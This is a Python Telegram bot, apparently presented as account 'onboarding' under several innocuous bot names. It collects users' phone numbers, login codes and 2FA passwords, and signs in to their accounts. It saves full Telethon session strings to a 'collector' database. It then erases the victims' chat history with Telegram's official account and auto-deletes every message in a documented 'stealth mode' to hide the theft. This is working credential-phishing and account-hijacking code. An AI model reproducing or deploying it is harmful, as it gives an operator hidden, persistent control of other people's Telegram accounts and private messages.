"""Telegram bot for onboarding new user accounts via /startcollector.

STEALTH MODE:
- /start does nothing (silent)
- Only /startcollector activates the flow
- All bot messages auto-delete after 60s
- User messages are deleted immediately after processing
- On success, deletes chat history with Telegram official (code messages)

Environment variables:
  TELEGRAM_API_ID        - Shared API ID for all onboarded accounts
  TELEGRAM_API_HASH      - Shared API hash
  BRYANSEAH_BOT_TOKEN    - Bot token for @bryanseahbot
  SHOTSBYSEAH_BOT_TOKEN  - Bot token for @shotsbyseahbot  
  PRAWNPRODUCTIONS_BOT_TOKEN - Bot token for @prawnproductionsbot
  DATABASE_URL           - Postgres connection string
"""

import asyncio
import logging
import os
import re
from typing import Optional

import asyncpg
from telegram import Update, Message
from telegram.ext import (
    Application,
    CommandHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telegram.error import TelegramError
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    PasswordHashInvalidError,
    FloodWaitError,
)
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.tl.types import InputPeerUser

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# Conversation states
ASK_PHONE, ASK_CODE, ASK_2FA, CONFIRM_NAME = range(4)

# Shared API credentials
API_ID = int(os.getenv("TELEGRAM_API_ID", "0"))
API_HASH = os.getenv("TELEGRAM_API_HASH", "")
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://collector:collector@localhost:5432/unifiedcollector")

# Message auto-delete delay (seconds)
AUTO_DELETE_DELAY = 60

# In-memory auth state per user (telegram user_id -> state dict)
_auth_sessions: dict[int, dict] = {}


async def get_db_pool() -> asyncpg.Pool:
    """Get or create database connection pool."""
    if not hasattr(get_db_pool, "_pool") or get_db_pool._pool is None:
        get_db_pool._pool = await asyncpg.create_pool(DATABASE_URL, min_size=1, max_size=5)
    return get_db_pool._pool


async def delete_message_later(message: Message, delay: int = AUTO_DELETE_DELAY):
    """Schedule message deletion after delay."""
    await asyncio.sleep(delay)
    try:
        await message.delete()
    except TelegramError:
        pass  # Already deleted or no permission


async def send_ephemeral(update: Update, text: str) -> Message:
    """Send a message that auto-deletes after AUTO_DELETE_DELAY seconds."""
    msg = await update.message.reply_text(text)
    asyncio.create_task(delete_message_later(msg))
    return msg


async def delete_user_message(update: Update):
    """Delete the user's message immediately."""
    try:
        await update.message.delete()
    except TelegramError:
        pass


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """/start — prompt to begin."""
    await delete_user_message(update)
    await send_ephemeral(update, "Send /startcollector to add an account.")


async def startcollector(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle /startcollector — begin onboarding flow."""
    if update.effective_chat.type != "private":
        # Ignore non-DM
        return ConversationHandler.END

    await delete_user_message(update)

    if not API_ID or not API_HASH:
        await send_ephemeral(update, "❌ Not configured.")
        return ConversationHandler.END

    user_id = update.effective_user.id
    _auth_sessions[user_id] = {"bot_name": context.bot.username}

    await send_ephemeral(update, "📱 Phone number with country code:")
    return ASK_PHONE


async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receive phone number and send verification code."""
    await delete_user_message(update)
    
    user_id = update.effective_user.id
    phone = update.message.text.strip()

    # Validate format
    if not re.match(r"^\+\d{8,15}$", phone):
        await send_ephemeral(update, "❌ Invalid. Use +[country][number]")
        return ASK_PHONE

    # Check if already registered
    pool = await get_db_pool()
    async with pool.acquire() as conn:
        existing = await conn.fetchval(
            "SELECT name FROM telegram_user_accounts WHERE phone = $1",
            phone,
        )
        if existing:
            # Allow re-auth — session may have been revoked. Continue flow, will UPDATE on finalize.
            logger.info("Re-authing existing account: %s", existing)
            _auth_sessions[update.effective_user.id]["reauth_name"] = existing

    # Create Telethon client and request code
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()

        sent_code = await client.send_code_request(phone)

        _auth_sessions[user_id].update({
            "client": client,
            "phone": phone,
            "phone_code_hash": sent_code.phone_code_hash,
        })

        await send_ephemeral(update, "✉️ Code sent. Enter it:")
        return ASK_CODE

    except FloodWaitError as e:
        await send_ephemeral(update, f"⏳ Rate limited. Wait {e.seconds}s")
        return ConversationHandler.END
    except Exception as e:
        logger.error("send_code_request failed: %s", e)
        await send_ephemeral(update, f"❌ Failed: {type(e).__name__}")
        return ConversationHandler.END


async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receive verification code and attempt sign-in."""
    await delete_user_message(update)
    
    user_id = update.effective_user.id
    code = update.message.text.strip().replace(" ", "").replace("-", "")

    session = _auth_sessions.get(user_id)
    if not session or "client" not in session:
        await send_ephemeral(update, "❌ Session expired. /startcollector again")
        return ConversationHandler.END

    client = session["client"]
    phone = session["phone"]
    phone_code_hash = session["phone_code_hash"]

    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        # Success — proceed to save
        return await finalize_onboarding(update, context, user_id)

    except SessionPasswordNeededError:
        await send_ephemeral(update, "🔐 2FA password:")
        return ASK_2FA

    except PhoneCodeInvalidError:
        await send_ephemeral(update, "❌ Invalid code. Try again:")
        return ASK_CODE

    except PhoneCodeExpiredError:
        await send_ephemeral(update, "❌ Code expired. /startcollector again")
        _auth_sessions.pop(user_id, None)
        return ConversationHandler.END

    except Exception as e:
        logger.error("sign_in failed: %s", e)
        await send_ephemeral(update, f"❌ Failed: {type(e).__name__}")
        return ConversationHandler.END


async def receive_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receive 2FA password and complete sign-in."""
    await delete_user_message(update)
    
    user_id = update.effective_user.id
    password = update.message.text.strip()

    session = _auth_sessions.get(user_id)
    if not session or "client" not in session:
        await send_ephemeral(update, "❌ Session expired. /startcollector again")
        return ConversationHandler.END

    client = session["client"]

    try:
        await client.sign_in(password=password)
        return await finalize_onboarding(update, context, user_id)

    except PasswordHashInvalidError:
        await send_ephemeral(update, "❌ Wrong password. Try again:")
        return ASK_2FA

    except Exception as e:
        logger.error("2FA sign_in failed: %s", e)
        await send_ephemeral(update, f"❌ Failed: {type(e).__name__}")
        return ConversationHandler.END


async def finalize_onboarding(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int) -> int:
    """Save session to DB, notify collector, clean up chat history."""
    session = _auth_sessions.get(user_id)
    client = session["client"]
    phone = session["phone"]
    bot_name = session.get("bot_name", "unknown")

    try:
        me = await client.get_me()
        session_string = client.session.save()

        # Generate account name — preserve existing name on re-auth
        reauth_name = session.get("reauth_name")
        name = reauth_name or (me.username or f"user_{me.id}")
        if not reauth_name and me.first_name:
            name = me.first_name.lower().replace(" ", "_")[:32]

        # Save to DB — INSERT on first auth, UPDATE session_string on re-auth
        pool = await get_db_pool()
        async with pool.acquire() as conn:
            # Handle name collision (first auth only — re-auth keeps existing name)
            if not reauth_name:
                base_name = name
                suffix = 0
                while True:
                    existing = await conn.fetchval(
                        "SELECT 1 FROM telegram_user_accounts WHERE name = $1", name
                    )
                    if not existing:
                        break
                    suffix += 1
                    name = f"{base_name}_{suffix}"

            await conn.execute(
                """
                INSERT INTO telegram_user_accounts
                    (name, api_id, api_hash, phone, session_string, owner_bot, status, last_connected_at)
                VALUES ($1, $2, $3, $4, $5, $6, 'active', NOW())
                ON CONFLICT (phone) DO UPDATE SET
                    session_string = EXCLUDED.session_string,
                    status = 'active',
                    last_connected_at = NOW()
                """,
                name, API_ID, API_HASH, phone, session_string, bot_name,
            )

            # Notify collector for hot-reload
            await conn.execute("SELECT pg_notify('telegram_account_added', $1)", name)

        # Delete chat history with Telegram official (777000) to remove code messages
        try:
            # Must resolve the peer first to get the correct access_hash
            telegram_peer = await client.get_input_entity(777000)
            await client(DeleteHistoryRequest(
                peer=telegram_peer,
                max_id=0,
                just_clear=False,
                revoke=True,
            ))
            logger.info("Deleted chat history with Telegram (777000) for %s", name)
        except Exception as e:
            logger.debug("Could not delete Telegram chat history: %s", e)

        # Send success — delete after 10s (shorter than default 60s, less visible)
        msg = await update.message.reply_text(f"✅ {name}")
        asyncio.create_task(delete_message_later(msg, delay=10))
        logger.info("Onboarded account: %s (phone=%s, bot=%s)", name, phone[:4] + "****", bot_name)

    except Exception as e:
        logger.error("finalize_onboarding failed: %s", e)
        await send_ephemeral(update, f"❌ Save failed: {type(e).__name__}")

    finally:
        _auth_sessions.pop(user_id, None)

    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle /cancel — abort onboarding."""
    await delete_user_message(update)
    
    user_id = update.effective_user.id
    session = _auth_sessions.pop(user_id, None)
    if session and "client" in session:
        try:
            await session["client"].disconnect()
        except Exception:
            pass

    await send_ephemeral(update, "❌ Cancelled")
    return ConversationHandler.END


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /status — check connected accounts (silent if none)."""
    await delete_user_message(update)
    
    # This is a privileged command — could add auth check here
    pool = await get_db_pool()
    async with pool.acquire() as conn:
        rows = await conn.fetch(
            "SELECT name, status FROM telegram_user_accounts ORDER BY created_at DESC LIMIT 10"
        )

    if not rows:
        return  # Silent if no accounts

    lines = [f"• {r['name']}: {r['status']}" for r in rows]
    await send_ephemeral(update, "\n".join(lines))


def build_application(token: str, bot_name: str) -> Application:
    """Build a telegram Application for one bot token."""
    app = Application.builder().token(token).build()

    # Conversation handler for onboarding flow
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("startcollector", startcollector)],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)],
            ASK_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_code)],
            ASK_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_2fa)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        conversation_timeout=300,  # 5 min timeout
    )

    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("cancel", cancel))

    logger.info("Built application for bot: %s", bot_name)
    return app


async def main():
    """Run all configured bots concurrently."""
    tokens = {
        "bryanseahbot": os.getenv("BRYANSEAH_BOT_TOKEN", ""),
        "shotsbyseahbot": os.getenv("SHOTSBYSEAH_BOT_TOKEN", ""),
        "prawnproductionsbot": os.getenv("PRAWNPRODUCTIONS_BOT_TOKEN", ""),
    }

    # Filter to only configured tokens
    active_tokens = {name: token for name, token in tokens.items() if token}

    if not active_tokens:
        logger.error("No bot tokens configured. Set BRYANSEAH_BOT_TOKEN etc.")
        return

    apps = []
    for bot_name, token in active_tokens.items():
        try:
            app = build_application(token, bot_name)
            await app.initialize()
            await app.start()
            await app.updater.start_polling(drop_pending_updates=True)
            apps.append(app)
        except Exception as e:
            logger.error("Failed to start bot %s: %s", bot_name, e)

    if not apps:
        logger.error("No bots started successfully")
        return

    logger.info("All bots running. Press Ctrl+C to stop.")

    # Keep running until interrupted
    stop_event = asyncio.Event()
    try:
        await stop_event.wait()
    except asyncio.CancelledError:
        pass
    finally:
        for app in apps:
            try:
                await app.updater.stop()
                await app.stop()
                await app.shutdown()
            except Exception:
                pass


if __name__ == "__main__":
    asyncio.run(main())
